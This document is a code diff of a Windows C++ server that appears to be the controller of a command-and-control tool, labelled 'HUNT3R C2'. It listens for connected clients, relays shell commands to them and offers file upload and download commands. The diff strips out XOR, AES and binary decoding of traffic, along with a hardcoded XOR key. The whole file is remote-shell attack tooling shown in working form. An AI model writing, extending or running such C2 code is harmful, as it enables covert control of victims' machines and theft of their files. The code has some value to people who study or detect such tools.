@@ -4,17 +4,17 @@
 //------------------------------------------------------------------------------------------INCLUDES
 #include <iostream>
 #include <cstdlib>
-#include <WinSock2.h>
+#include <WinSock2.h> // Socket
 #include <ws2tcpip.h>
 #include <string>
 #include <map>
 #include <unordered_map>
-#include <thread> // Thread Management
-#include <chrono> // Time Management
-#include <mutex> 
-#include <Windows.h>
-#include <openssl/aes.h> // AES
-#include <bitset> // BIN
+#include <thread> // Thread -> Async Operations
+#include <chrono> 
+#include <mutex> // Sync Output
+#include <Windows.h> // Win
+//#include <openssl/aes.h> // AES
+#include <bitset>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -22,7 +22,8 @@
 //------------------------------------------------------------------------------------------MUTEX -> mtx
 std::mutex mtx; // Mutex -> Sync Output 
 
-std::string xClientID = "XCLIENT00001";
+//std::string xClientID = "XCLIENT00001"; // XID = HUNT3R C2 SYNC
+
 
 
 //------------------------------------------------------------------------------------------ASCII STARTUP
@@ -42,69 +43,6 @@ void PrintAsciiArtBanner() {
 
 //------------------------------------------------------------------------------------------VALIDATE AND SET ENCRYPTION
 int yGlobalEncryption = 0;
-void xValidateAndSetEncryption(const std::string& yEncryptionMethod) {
-    std::unordered_map<std::string, int> yEncryptionMap = { // Define a Map Associating Encryption Methods with their Corresponding Numbers
-        {"aes", 1},
-        {"xor", 2},
-        {"bin", 3}
-    };
-
-    auto it = yEncryptionMap.find(yEncryptionMethod);
-
-    if (it != yEncryptionMap.end()) { // Validate Encryption Method
-        yGlobalEncryption = it->second;
-    }
-
-    else {
-        std::cout << "[!] NO ENCRYPTION SET [!]\n";
-        yGlobalEncryption = 0;  // 0 -> No Encryption
-    }
-}
-
-
-//------------------------------------------------------------------------------------------AES DECRYPTION 
-std::string xDecryptAES(const std::string& yCiphertext, const std::string& yKey, const std::string& iv) {
-    AES_KEY decryptKey;
-    AES_set_decrypt_key(reinterpret_cast<const unsigned char*>(yKey.c_str()), 128, &decryptKey);
-
-    std::string yDecryptedText;
-    yDecryptedText.resize(yCiphertext.size());
-
-    AES_decrypt(reinterpret_cast<const unsigned char*>(yCiphertext.c_str()),
-        reinterpret_cast<unsigned char*>(&yDecryptedText[0]),
-        &decryptKey);
-
-    return yDecryptedText;
-}
-
-
-//------------------------------------------------------------------------------------------XOR DECRYPTION 
-std::string xDecryptXOR(const std::string& yCiphertext, const std::string& yKey) {
-    std::string yDecryptedText;
-    yDecryptedText.reserve(yCiphertext.length());
-
-    for (std::size_t i = 0; i < yCiphertext.length(); ++i) {
-        yDecryptedText += yCiphertext[i] ^ yKey[i % yKey.length()];
-    }
-
-    return yDecryptedText;
-}
-
-
-//------------------------------------------------------------------------------------------BIN DECRYPTION 
-std::string xDecryptBinary(const std::string& yEncryptedText) {
-    std::string yDecryptedText;
-
-    for (size_t i = 0; i < yEncryptedText.length(); i += 8) {
-        std::string byte = yEncryptedText.substr(i, 8);
-
-        unsigned char yDecryptedByte = std::bitset<8>(byte).to_ulong();
-
-        yDecryptedText += yDecryptedByte;
-    }
-
-    return yDecryptedText;
-}
 
 
 //------------------------------------------------------------------------------------------HANDLE CLIENT SHELL SESSION FUNCTION
@@ -129,18 +67,7 @@ void xHandleClient(SOCKET clientSocket) {
                 std::string yDecryptedCommand /*= xDecryptAES(yCommand, aesKey, aesIV)*/;
                 std::cout << std::endl << yDecryptedCommand << std::endl;
             }
-
-            else if (yGlobalEncryption == 2) {
-                const std::string xorKey = "HUNT3RkEyGenx23KKkwzQUdAq";
-                std::string yDecryptedCommand = xDecryptXOR(yCommand, xorKey);
-                std::cout << std::endl << yDecryptedCommand << std::endl;
-            }
-
-            else if (yGlobalEncryption == 3) {
-                std::string yDecryptedText = xDecryptBinary(yCommand);
-                std::cout << std::endl << yDecryptedText << std::endl;
-            }
-
+            
             else if (yGlobalEncryption == 0) {
                 std::cout << std::endl << yCommand << std::endl;
             }
@@ -172,18 +99,18 @@ void xInputThread(SOCKET clientSocket) {
 
         if (yUserInput == "exit ") { // exit -> End Input Loop
             break;
-        } 
-        
+        }
+
         else if (yUserInput == "xdownload ") { // Download File
             std::cout << "DOWNLOAD FILES" << std::endl;
             std::cout << "Usage: [File , Destination] file_i_want_to_download.txt , C:/Destination/Path" << std::endl;
-        } 
-        
+        }
+
         else if (yUserInput == "xupload ") { // Upload File
             std::cout << "UPLOAD FILES" << std::endl;
             std::cout << "Usage: [File , Destination] file_i_want_to_upload.txt , C:/Destination/Path" << std::endl;
-        } 
-        
+        }
+
         else if (yUserInput.substr(0, 7) == "xcolor ") { // Change Colors
             std::string yUserInput = yUserInput.substr(7); // Extract Font Color and Background Color from User Input
             std::istringstream zIss(yUserInput);
@@ -214,12 +141,6 @@ void xInputThread(SOCKET clientSocket) {
             }
         }
     }
-}
-
-
-//------------------------------------------------------------------------------------------AJAX INPUT FUNCTION
-void xAjaxInput(SOCKET clientSocket, const std::string& yCommand) {
-    send(clientSocket, yCommand.c_str(), yCommand.length(), 0); // Command -> Client
 }
 
 
@@ -285,7 +206,7 @@ void xStartListener(int yPort) {
 int main() {
     SetConsoleOutputCP(CP_UTF8); // Set Console Output -> UTF8
     PrintAsciiArtBanner(); // Print Ascii Banner
-    
+
     //------------------------------------------------------------------------------------------>STARTUP MENU
     std::string yEncryptionMethod = ""; // User Input -> Encryption Method AES / PGP / XOR / BIN
     int yPort = 0; // User Input -> Listener Port
@@ -295,11 +216,12 @@ int main() {
     std::cin >> yPort;
     //std::cout << std::endl;
 
-    std::cout << "Encryption Method: ";
-    std::cin >> yEncryptionMethod;
-    xValidateAndSetEncryption(yEncryptionMethod); 
+    //std::cout << "Encryption Method: ";
+    //std::cin >> yEncryptionMethod;
+    //xValidateAndSetEncryption(yEncryptionMethod);
     std::cout << "-------------------------------------------------" << std::endl;
     std::cout << std::endl;
+    //system("cls");
 
     //------------------------------------------------------------------------------------------>START LISTENER
     xStartListener(yPort); // Call -> xStartListener Function
